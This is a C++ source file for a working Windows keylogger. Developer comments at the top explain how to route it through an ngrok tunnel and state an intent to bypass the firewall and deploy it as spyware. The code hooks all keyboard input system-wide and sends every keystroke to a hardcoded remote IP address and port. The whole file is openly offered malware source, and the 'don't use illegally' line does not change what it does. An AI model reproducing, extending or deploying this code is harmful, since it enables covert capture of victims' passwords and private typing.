// Developer note (:

// As you probably can see this code does not run on local host.
// My target was to actually try and imitate a real world scenario (except I still need to bypass windows firewall and actually implement it as a spyware somewhere in the future).
// The only problem was I couln't achive port forwarding due to the fact that I dont have access to my router admin page.
// The solution was a tool called ngrok! to make the code work you need to have ngrok installed on the server machine.
// If you have ngrok all you need to do is to open the cmd and type: ngrok tcp <port>
// The <port> field is a port that you need to open as a new inboud rule on the server machine firewall (the server code currently expects port 5000 to be open).
// After that copy the IP and port to the code and done! looks something like this: 0.tcp.eu.ngrok.io:19364 
// convert 0.tcp.eu.ngrok.io to IP using nslookup or any other method.

// Also dont use this code for any illegal uses.

// compiled for me using: g++ -o YourProgramName.exe YourSourceFile.cpp -lws2_32 -lwsock32

#define _WINSOCK_DEPRECATED_NO_WARNINGS
#define _WIN32_LEAN_AND_MEAN_
#include <iostream>
#include <winsock2.h>
#include <Ws2tcpip.h>
#include <windows.h>
#include <string>
#include <cstring>
#include <stdexcept>

#pragma comment(lib, "ws2_32.lib")

SOCKET clientSocket = INVALID_SOCKET;

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (nCode == HC_ACTION)
    {
        PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT)lParam;
        if (wParam == WM_KEYDOWN)
        {
            char keyName[64] = { 0 };
            LONG key = (p->scanCode << 16) | (p->flags << 24);

            if (GetKeyNameTextA(key, keyName, sizeof(keyName)) > 0)
            {
                send(clientSocket, keyName, static_cast<int>(strlen(keyName)), 0);
            }
        }
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

int main()
{
    WSADATA wsaData;
    struct sockaddr_in serverAddr;
    const char* serverIP = "3.125.188.168";
    int port = 18051;

    try
    {
        if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
        {
            throw std::runtime_error("WSAStartup failed.");
        }

        if ((clientSocket = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET)
        {
            WSACleanup();
            throw std::runtime_error("Could not create socket");
            return 1;
        }

        serverAddr.sin_family = AF_INET;
        serverAddr.sin_port = htons(static_cast<u_short>(port));
        serverAddr.sin_addr.s_addr = inet_addr(serverIP);

        if (connect(clientSocket, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) < 0)
        {
            closesocket(clientSocket);
            WSACleanup();
            throw std::runtime_error("faild to connect to server");
        }

        HHOOK keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);

        if (keyboardHook == NULL)
        {
            throw std::runtime_error("faild to init keyboard hook");
        }

        MSG msg;
        while (GetMessage(&msg, NULL, 0, 0))
        {
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }
    }

    catch (std::runtime_error &e)
    {
        std::cout << e.what() << std::endl;
    }

    return 0;
}